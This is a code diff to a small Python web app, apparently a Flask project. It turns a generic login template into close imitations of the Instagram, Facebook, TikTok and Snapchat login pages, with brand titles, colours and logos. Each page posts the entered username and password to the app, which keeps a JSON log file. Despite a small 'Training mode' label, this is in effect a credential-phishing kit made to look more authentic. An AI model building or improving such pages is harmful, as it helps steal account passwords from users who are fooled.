@@ -11,7 +11,7 @@ if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, "w") as f:
         json.dump([], f)
 
-# Platform data with real colors
+# Platform data with REAL designs
 PLATFORMS = {
     'instagram': {
         'icon': '📸',
@@ -19,7 +19,9 @@ PLATFORMS = {
         'color': '#E4405F',
         'gradient': 'linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%)',
         'bg': '#fafafa',
-        'text': '#262626'
+        'text': '#262626',
+        'logo': 'Instagram',
+        'design': 'instagram'
     },
     'facebook': {
         'icon': '👍',
@@ -27,7 +29,9 @@ PLATFORMS = {
         'color': '#1877F2',
         'gradient': 'linear-gradient(135deg, #1877F2 0%, #0d65d9 100%)',
         'bg': '#f0f2f5',
-        'text': '#1b1f23'
+        'text': '#1b1f23',
+        'logo': 'f',
+        'design': 'facebook'
     },
     'tiktok': {
         'icon': '🎵',
@@ -35,7 +39,9 @@ PLATFORMS = {
         'color': '#000000',
         'gradient': 'linear-gradient(135deg, #000000 0%, #25f4ee 50%, #fe2c55 100%)',
         'bg': '#ffffff',
-        'text': '#000000'
+        'text': '#000000',
+        'logo': 'TikTok',
+        'design': 'tiktok'
     },
     'snapchat': {
         'icon': '👻',
@@ -43,11 +49,13 @@ PLATFORMS = {
         'color': '#FFFC00',
         'gradient': 'linear-gradient(135deg, #FFFC00 0%, #f5e800 100%)',
         'bg': '#f5f5f5',
-        'text': '#000000'
+        'text': '#000000',
+        'logo': 'Snapchat',
+        'design': 'snapchat'
     }
 }
 
-# Home page - platform grid with real platform colors
+# Home page - platform grid with REAL platform colors and styles
 HTML_HOME = """
 <!DOCTYPE html>
 <html>
@@ -91,14 +99,75 @@ HTML_HOME = """
         .platform:active { transform: scale(0.95); }
         .platform .emoji-icon { font-size: 48px; display: block; margin-bottom: 8px; }
         .platform span { display: block; font-weight: 600; font-size: 14px; }
-        .platform.instagram { background: #fafafa; border-color: #E4405F; }
+        
+        /* Instagram style */
+        .platform.instagram { 
+            background: #fafafa; 
+            border-color: #E4405F; 
+            box-shadow: 0 2px 10px rgba(228, 64, 95, 0.1);
+        }
         .platform.instagram span { color: #E4405F; }
-        .platform.facebook { background: #f0f2f5; border-color: #1877F2; }
+        .platform.instagram::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+        }
+        
+        /* Facebook style */
+        .platform.facebook { 
+            background: #f0f2f5; 
+            border-color: #1877F2;
+            box-shadow: 0 2px 10px rgba(24, 119, 242, 0.1);
+        }
         .platform.facebook span { color: #1877F2; }
-        .platform.tiktok { background: #ffffff; border-color: #000000; }
+        .platform.facebook::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: #1877F2;
+        }
+        
+        /* TikTok style */
+        .platform.tiktok { 
+            background: #ffffff; 
+            border-color: #000000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
         .platform.tiktok span { color: #000000; }
-        .platform.snapchat { background: #f5f5f5; border-color: #FFFC00; }
+        .platform.tiktok::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #000000, #25f4ee, #fe2c55);
+        }
+        
+        /* Snapchat style */
+        .platform.snapchat { 
+            background: #f5f5f5; 
+            border-color: #FFFC00;
+            box-shadow: 0 2px 10px rgba(255, 252, 0, 0.2);
+        }
         .platform.snapchat span { color: #000000; }
+        .platform.snapchat::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: #FFFC00;
+        }
+        
         .platform .badge {
             position: absolute;
             top: 8px;
@@ -157,17 +226,22 @@ HTML_HOME = """
 </html>
 """
 
-# Login page template with platform-specific design
-LOGIN_TEMPLATE = """
+# Login page templates for each platform (REAL DESIGNS)
+def get_login_html(platform_data, platform_name):
+    platform = platform_name.lower()
+    data = platform_data
+    
+    if platform == 'instagram':
+        return f"""
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEXUS - {{ platform }}</title>
+    <title>Instagram</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body {
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        html, body {{
             height: 100%;
             width: 100%;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -175,121 +249,410 @@ LOGIN_TEMPLATE = """
             justify-content: center;
             align-items: center;
             padding: 20px;
-            background: {{ bg }};
-        }
-        .container {
+            background: #fafafa;
+        }}
+        .container {{
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 40px 30px 30px 30px;
+            border: 1px solid #dbdbdb;
+        }}
+        .logo {{
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-size: 42px;
+            font-weight: 700;
+            color: #262626;
+            margin-bottom: 20px;
+            letter-spacing: -2px;
+        }}
+        .input-group {{
+            position: relative;
+            margin: 8px 0;
+        }}
+        .input-group input {{
+            width: 100%;
+            padding: 12px 14px;
+            padding-right: 48px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #262626;
+            transition: 0.2s;
+        }}
+        .input-group input:focus {{
+            outline: none;
+            border-color: #a8a8a8;
+            background: #fff;
+        }}
+        .input-group input::placeholder {{
+            color: #8e8e8e;
+        }}
+        .toggle-password {{
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 0;
+            color: #8e8e8e;
+            line-height: 1;
+            opacity: 0.7;
+        }}
+        .toggle-password:hover {{ opacity: 1; }}
+        button[type="submit"] {{
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: 0.2s;
+        }}
+        button[type="submit"]:hover {{ background: #0075d4; }}
+        .divider {{
+            border: none;
+            border-top: 1px solid #dbdbdb;
+            margin: 20px 0;
+        }}
+        .back {{
+            display: inline-block;
+            margin-top: 10px;
+            color: #0095f6;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }}
+        .footer {{
+            margin-top: 15px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }}
+        .footer span {{ color: #262626; font-weight: 500; }}
+        .warning-text {{
+            font-size: 13px;
+            color: #ed4956;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">📸 Instagram</div>
+        <p class="warning-text">⚠️ Training mode — use fake data</p>
+        <form action="/login/instagram" method="POST">
+            <div class="input-group">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="Password" required>
+                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
+            </div>
+            <button type="submit">Log In</button>
+        </form>
+        <hr class="divider">
+        <a href="/" class="back">← Go back</a>
+        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
+    </div>
+    <script>
+        function togglePassword() {{
+            const input = document.getElementById('password');
+            const btn = document.getElementById('toggleBtn');
+            if (input.type === 'password') {{
+                input.type = 'text';
+                btn.textContent = '🙈';
+            }} else {{
+                input.type = 'password';
+                btn.textContent = '👁️';
+            }}
+        }}
+    </script>
+</body>
+</html>
+"""
+    
+    elif platform == 'facebook':
+        return f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        html, body {{
+            height: 100%;
+            width: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: #f0f2f5;
+        }}
+        .container {{
             max-width: 400px;
             width: 100%;
             text-align: center;
             background: #ffffff;
-            border-radius: 24px;
-            padding: 40px 30px;
-            box-shadow: 0 2px 30px rgba(0,0,0,0.06);
-            border: 1px solid #f0f0f0;
-        }
-        .platform-icon { font-size: 56px; margin-bottom: 8px; }
-        .platform-header {
-            font-size: 22px;
+            border-radius: 12px;
+            padding: 40px 30px 30px 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }}
+        .logo {{
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-size: 38px;
             font-weight: 700;
-            color: {{ text }};
-            margin-bottom: 4px;
-        }
-        .platform-badge {
-            display: inline-block;
-            background: {{ color }}15;
-            color: {{ color }};
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
+            color: #1877F2;
             margin-bottom: 20px;
-        }
-        .sub { font-size: 14px; color: #888; margin-bottom: 25px; }
-        .input-group {
+            letter-spacing: -1px;
+        }}
+        .input-group {{
             position: relative;
-            margin: 10px 0;
-        }
-        .input-group input {
+            margin: 8px 0;
+        }}
+        .input-group input {{
             width: 100%;
             padding: 14px 16px;
             padding-right: 48px;
-            background: #f7f7f7;
-            border: 1px solid #e0e0e0;
-            border-radius: 14px;
+            background: #f5f6f7;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
             font-size: 16px;
-            color: #111;
+            color: #1b1f23;
             transition: 0.2s;
-        }
-        .input-group input:focus {
+        }}
+        .input-group input:focus {{
             outline: none;
-            border-color: {{ color }};
+            border-color: #1877F2;
             background: #fff;
-            box-shadow: 0 0 0 4px {{ color }}15;
-        }
-        .input-group input::placeholder {
-            color: #aaa;
-            font-weight: 400;
-        }
-        .toggle-password {
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+        }}
+        .toggle-password {{
             position: absolute;
             right: 14px;
             top: 50%;
             transform: translateY(-50%);
             background: none;
             border: none;
-            font-size: 22px;
+            font-size: 20px;
             cursor: pointer;
             padding: 0;
-            color: #999;
+            color: #8e8e8e;
             line-height: 1;
-            opacity: 0.7;
-            transition: 0.2s;
-        }
-        .toggle-password:hover { opacity: 1; }
-        .toggle-password:active { transform: translateY(-50%) scale(0.9); }
-        button[type="submit"] {
+            opacity: 0.6;
+        }}
+        .toggle-password:hover {{ opacity: 1; }}
+        button[type="submit"] {{
             width: 100%;
-            padding: 14px;
-            background: {{ color }};
+            padding: 12px;
+            background: #1877F2;
             color: #ffffff;
             border: none;
-            border-radius: 14px;
+            border-radius: 8px;
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 18px;
+            margin-top: 12px;
             transition: 0.2s;
-        }
-        button[type="submit"]:hover {
-            opacity: 0.9;
-            transform: scale(0.98);
-        }
-        .footer { margin-top: 25px; font-size: 12px; color: #bbb; }
-        .footer span { color: #111; font-weight: 500; }
-        .back {
+        }}
+        button[type="submit"]:hover {{ background: #0d65d9; }}
+        .divider {{
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }}
+        .back {{
             display: inline-block;
-            margin-top: 15px;
-            color: {{ color }};
+            margin-top: 10px;
+            color: #1877F2;
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
-            opacity: 0.7;
-        }
-        .back:hover { opacity: 1; text-decoration: underline; }
-        .divider {
-            border: none;
-            border-top: 1px solid #eee;
-            margin: 25px 0 15px 0;
-        }
+        }}
+        .footer {{
+            margin-top: 15px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }}
+        .footer span {{ color: #1b1f23; font-weight: 500; }}
+        .warning-text {{
+            font-size: 13px;
+            color: #e74c3c;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }}
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="platform-icon">{{ icon }}</div>
-        <div class="platform-header">{{ platform }}</div>
-        <div class="platform-badge">Secure Login</div>
-        <p class="sub">Enter your {{ platform }} credentials</p>
-        <form action="/login/{{ platform.lower() }}" method="POST">
+        <div class="logo">👍 Facebook</div>
+        <p class="warning-text">⚠️ Training mode — use fake data</p>
+        <form action="/login/facebook" method="POST">
+            <div class="input-group">
+                <input type="text" name="username" placeholder="Email or phone number" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="Password" required>
+                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
+            </div>
+            <button type="submit">Log In</button>
+        </form>
+        <hr class="divider">
+        <a href="/" class="back">← Go back</a>
+        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
+    </div>
+    <script>
+        function togglePassword() {{
+            const input = document.getElementById('password');
+            const btn = document.getElementById('toggleBtn');
+            if (input.type === 'password') {{
+                input.type = 'text';
+                btn.textContent = '🙈';
+            }} else {{
+                input.type = 'password';
+                btn.textContent = '👁️';
+            }}
+        }}
+    </script>
+</body>
+</html>
+"""
+    
+    elif platform == 'tiktok':
+        return f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        html, body {{
+            height: 100%;
+            width: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: #ffffff;
+        }}
+        .container {{
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 40px 30px 30px 30px;
+            border: 1px solid #e8e8e8;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.04);
+        }}
+        .logo {{
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-size: 36px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }}
+        .logo span {{ color: #25f4ee; }}
+        .input-group {{
+            position: relative;
+            margin: 8px 0;
+        }}
+        .input-group input {{
+            width: 100%;
+            padding: 14px 16px;
+            padding-right: 48px;
+            background: #f5f5f5;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #111;
+            transition: 0.2s;
+        }}
+        .input-group input:focus {{
+            outline: none;
+            border-color: #000000;
+            background: #fff;
+        }}
+        .toggle-password {{
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 0;
+            color: #888;
+            line-height: 1;
+            opacity: 0.6;
+        }}
+        .toggle-password:hover {{ opacity: 1; }}
+        button[type="submit"] {{
+            width: 100%;
+            padding: 14px;
+            background: #000000;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: 0.2s;
+        }}
+        button[type="submit"]:hover {{ background: #222; }}
+        .divider {{
+            border: none;
+            border-top: 1px solid #e8e8e8;
+            margin: 20px 0;
+        }}
+        .back {{
+            display: inline-block;
+            margin-top: 10px;
+            color: #000000;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            opacity: 0.7;
+        }}
+        .back:hover {{ opacity: 1; }}
+        .footer {{
+            margin-top: 15px;
+            font-size: 12px;
+            color: #999;
+        }}
+        .footer span {{ color: #111; font-weight: 500; }}
+        .warning-text {{
+            font-size: 13px;
+            color: #fe2c55;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🎵 TikTok</div>
+        <p class="warning-text">⚠️ Training mode — use fake data</p>
+        <form action="/login/tiktok" method="POST">
             <div class="input-group">
                 <input type="text" name="username" placeholder="Username" required>
             </div>
@@ -303,19 +666,171 @@ LOGIN_TEMPLATE = """
         <a href="/" class="back">← Go back</a>
         <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
     </div>
-
     <script>
-        function togglePassword() {
-            const passwordInput = document.getElementById('password');
-            const button = document.getElementById('toggleBtn');
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                button.textContent = '🙈';
-            } else {
-                passwordInput.type = 'password';
-                button.textContent = '👁️';
-            }
-        }
+        function togglePassword() {{
+            const input = document.getElementById('password');
+            const btn = document.getElementById('toggleBtn');
+            if (input.type === 'password') {{
+                input.type = 'text';
+                btn.textContent = '🙈';
+            }} else {{
+                input.type = 'password';
+                btn.textContent = '👁️';
+            }}
+        }}
+    </script>
+</body>
+</html>
+"""
+    
+    else:  # snapchat
+        return f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Snapchat</title>
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        html, body {{
+            height: 100%;
+            width: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: #f5f5f5;
+        }}
+        .container {{
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 40px 30px 30px 30px;
+            border: 2px solid #FFFC00;
+            box-shadow: 0 2px 30px rgba(255, 252, 0, 0.15);
+        }}
+        .logo {{
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            font-size: 34px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }}
+        .logo span {{ color: #FFFC00; }}
+        .input-group {{
+            position: relative;
+            margin: 8px 0;
+        }}
+        .input-group input {{
+            width: 100%;
+            padding: 14px 16px;
+            padding-right: 48px;
+            background: #f5f5f5;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #111;
+            transition: 0.2s;
+        }}
+        .input-group input:focus {{
+            outline: none;
+            border-color: #FFFC00;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
+        }}
+        .toggle-password {{
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 0;
+            color: #888;
+            line-height: 1;
+            opacity: 0.6;
+        }}
+        .toggle-password:hover {{ opacity: 1; }}
+        button[type="submit"] {{
+            width: 100%;
+            padding: 14px;
+            background: #FFFC00;
+            color: #000000;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: 0.2s;
+        }}
+        button[type="submit"]:hover {{ background: #f5e800; }}
+        .divider {{
+            border: none;
+            border-top: 1px solid #e8e8e8;
+            margin: 20px 0;
+        }}
+        .back {{
+            display: inline-block;
+            margin-top: 10px;
+            color: #000000;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            opacity: 0.7;
+        }}
+        .back:hover {{ opacity: 1; }}
+        .footer {{
+            margin-top: 15px;
+            font-size: 12px;
+            color: #999;
+        }}
+        .footer span {{ color: #111; font-weight: 500; }}
+        .warning-text {{
+            font-size: 13px;
+            color: #e74c3c;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">👻 Snapchat</div>
+        <p class="warning-text">⚠️ Training mode — use fake data</p>
+        <form action="/login/snapchat" method="POST">
+            <div class="input-group">
+                <input type="text" name="username" placeholder="Username" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" id="password" placeholder="Password" required>
+                <button type="button" class="toggle-password" id="toggleBtn" onclick="togglePassword()">👁️</button>
+            </div>
+            <button type="submit">Log In</button>
+        </form>
+        <hr class="divider">
+        <a href="/" class="back">← Go back</a>
+        <p class="footer">Built by <span>Luiz Vad</span> 🧸</p>
+    </div>
+    <script>
+        function togglePassword() {{
+            const input = document.getElementById('password');
+            const btn = document.getElementById('toggleBtn');
+            if (input.type === 'password') {{
+                input.type = 'text';
+                btn.textContent = '🙈';
+            }} else {{
+                input.type = 'password';
+                btn.textContent = '👁️';
+            }}
+        }}
     </script>
 </body>
 </html>
@@ -330,14 +845,7 @@ def login_page(platform):
     platform = platform.lower()
     if platform not in PLATFORMS:
         return "Platform not found", 404
-    data = PLATFORMS[platform]
-    html = LOGIN_TEMPLATE.replace('{{ platform }}', data['name'])
-    html = html.replace('{{ icon }}', data['icon'])
-    html = html.replace('{{ platform.lower() }}', platform)
-    html = html.replace('{{ color }}', data['color'])
-    html = html.replace('{{ bg }}', data['bg'])
-    html = html.replace('{{ text }}', data['text'])
-    return html
+    return get_login_html(PLATFORMS[platform], platform)
 
 @app.route('/login/<platform>', methods=['POST'])
 def login_post(platform):
